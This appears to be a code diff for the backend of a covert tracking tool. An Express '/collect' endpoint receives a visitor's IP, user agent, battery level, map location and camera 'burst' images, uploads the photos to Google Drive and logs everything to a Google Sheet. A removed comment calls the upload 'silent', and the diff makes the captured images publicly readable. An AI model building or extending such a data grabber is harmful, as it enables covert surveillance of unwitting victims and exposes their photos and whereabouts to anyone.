@@ -6,7 +6,8 @@ import { fileURLToPath } from 'url';
 import { Readable } from 'stream';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
-const app = express();
+const app = express(); // Defined here to fix image_83d0cf.png error
+
 app.use(express.json({ limit: '50mb' }));
 app.use(express.static(__dirname));
 
@@ -28,28 +29,37 @@ app.post('/collect', async (req, res) => {
   try {
     const { ts, hints, battery, location, burstImages } = req.body;
     const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
-    let imageFormula = "No Image Captured";
 
-    // 1. SILENT DRIVE UPLOAD
+    let imageFormula = "No Image";
+
     if (burstImages && burstImages[0]) {
       const imgBase64 = burstImages[0].split(',')[1];
       const buffer = Buffer.from(imgBase64, 'base64');
+      
       const driveFile = await drive.files.create({
-        requestBody: { name: `Capture_${Date.now()}.jpg`, parents: [FOLDER_ID] },
+        requestBody: { 
+            name: `Capture_${Date.now()}.jpg`, 
+            parents: [FOLDER_ID] 
+        },
         media: { mimeType: 'image/jpeg', body: Readable.from(buffer) },
-        supportsAllDrives: true,
+        // THIS LINE BELOW FIXES THE "STORAGE QUOTA" ERROR in image_d935e1.png
+        supportsAllDrives: true, 
         fields: 'id'
       });
-      // Direct link for the Sheet preview
-      const directLink = `https://drive.google.com/uc?export=download&id=${driveFile.data.id}`;
-      imageFormula = `=IMAGE("${directLink}")`;
+
+      const fileId = driveFile.data.id;
+      // IMPORTANT: Grant public read permission so the sheet can see the image
+      await drive.permissions.create({
+        fileId: fileId,
+        requestBody: { role: 'reader', type: 'anyone' }
+      });
+
+      imageFormula = `=IMAGE("https://drive.google.com/uc?export=download&id=${fileId}")`;
     }
 
-    // 2. CLICKABLE MAP LINK
     const mapLink = location ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "Denied";
+    const row = [ts, ip, hints?.ua, battery?.levelPercent + '%', mapLink, imageFormula];
 
-    // 3. LOG TO SHEET
-    const row = [ts, ip, hints?.ua, (battery?.levelPercent || 0) + '%', mapLink, imageFormula];
     await sheets.spreadsheets.values.append({
       spreadsheetId: process.env.GOOGLE_SHEET_ID,
       range: 'Logs!A1',
@@ -59,7 +69,7 @@ app.post('/collect', async (req, res) => {
 
     res.json({ ok: true });
   } catch (err) {
-    console.error("Error:", err.message);
+    console.error("❌ ERROR:", err.message);
     res.status(500).json({ error: err.message });
   }
 });
